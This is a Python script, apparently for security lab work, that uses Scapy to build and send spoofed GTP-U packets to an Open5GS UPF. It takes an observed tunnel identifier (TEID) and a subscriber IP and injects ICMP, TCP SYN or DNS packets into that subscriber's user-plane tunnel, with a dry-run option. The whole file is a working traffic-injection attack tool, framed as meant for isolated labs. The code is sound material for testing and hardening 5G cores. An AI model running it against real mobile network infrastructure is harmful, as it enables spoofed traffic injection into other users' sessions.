#!/usr/bin/env python3
"""GTP-U injection helper for the Open5GS/UERANSIM lab.

Run only inside an isolated lab you control. Supply the TEID and addressing
values observed from your own GTP-U capture.
"""

from __future__ import annotations

import argparse
import ipaddress
import sys

from scapy.all import DNS, DNSQR, ICMP, IP, TCP, UDP, RandShort, send
from scapy.contrib.gtp import GTP_U_Header


def parse_teid(value: str) -> int:
    try:
        teid = int(value, 0)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(
            "TEID must be an integer, for example 1 or 0x00000001"
        ) from exc

    if not 0 <= teid <= 0xFFFFFFFF:
        raise argparse.ArgumentTypeError("TEID must fit in 32 bits")
    return teid


def parse_ip(value: str) -> str:
    try:
        return str(ipaddress.ip_address(value))
    except ValueError as exc:
        raise argparse.ArgumentTypeError(f"invalid IP address: {value}") from exc


def build_inner_payload(args: argparse.Namespace):
    if args.payload == "icmp":
        return IP(src=args.ue_ip, dst=args.target_ip) / ICMP()

    if args.payload == "tcp-syn":
        return IP(src=args.ue_ip, dst=args.target_ip) / TCP(
            sport=RandShort(),
            dport=args.target_port,
            flags="S",
        )

    if args.payload == "dns":
        return (
            IP(src=args.ue_ip, dst=args.target_ip)
            / UDP(sport=RandShort(), dport=53)
            / DNS(rd=1, qd=DNSQR(qname=args.dns_name))
        )

    raise ValueError(f"unsupported payload: {args.payload}")


def build_packet(args: argparse.Namespace):
    outer = IP(src=args.gnb_ip, dst=args.upf_ip) / UDP(
        sport=args.gtp_port,
        dport=args.gtp_port,
    )
    return outer / GTP_U_Header(teid=args.teid) / build_inner_payload(args)


def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Craft and send one lab GTP-U packet to an Open5GS UPF."
    )
    parser.add_argument(
        "--upf-ip",
        type=parse_ip,
        default="127.0.0.7",
        help="UPF N3 GTP-U address from /etc/open5gs/upf.yaml.",
    )
    parser.add_argument(
        "--gnb-ip",
        type=parse_ip,
        default="127.0.0.1",
        help="Outer source IP observed in a real UERANSIM GTP-U capture.",
    )
    parser.add_argument(
        "--gtp-port",
        type=int,
        default=2152,
        help="GTP-U UDP port.",
    )
    parser.add_argument(
        "--teid",
        type=parse_teid,
        required=True,
        help="Observed GTP-U TEID, for example 0x00000001.",
    )
    parser.add_argument(
        "--ue-ip",
        type=parse_ip,
        required=True,
        help="UE PDU session IP assigned to uesimtun0.",
    )
    parser.add_argument(
        "--target-ip",
        type=parse_ip,
        default="8.8.8.8",
        help="Inner packet destination IP.",
    )
    parser.add_argument(
        "--payload",
        choices=("icmp", "tcp-syn", "dns"),
        default="icmp",
        help="Inner packet payload to inject.",
    )
    parser.add_argument(
        "--target-port",
        type=int,
        default=80,
        help="TCP destination port for --payload tcp-syn.",
    )
    parser.add_argument(
        "--dns-name",
        default="example.com",
        help="DNS query name for --payload dns.",
    )
    parser.add_argument(
        "--count",
        type=int,
        default=1,
        help="Number of packets to send.",
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=0.1,
        help="Delay between packets when count is greater than 1.",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Show the packet and exit without sending.",
    )
    return parser.parse_args(argv)


def main(argv: list[str]) -> int:
    args = parse_args(argv)
    packet = build_packet(args)

    print("[*] Crafted GTP-U packet")
    print(f"    outer: {args.gnb_ip} -> {args.upf_ip}:{args.gtp_port}")
    print(f"    teid : 0x{args.teid:08x}")
    print(f"    inner: {args.ue_ip} -> {args.target_ip} ({args.payload})")
    packet.show()

    if args.dry_run:
        print("[*] Dry run requested; not sending.")
        return 0

    print(f"[*] Sending {args.count} packet(s). Monitor ogstun with tcpdump.")
    send(packet, count=args.count, inter=args.interval, verbose=True)
    print("[+] Done.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
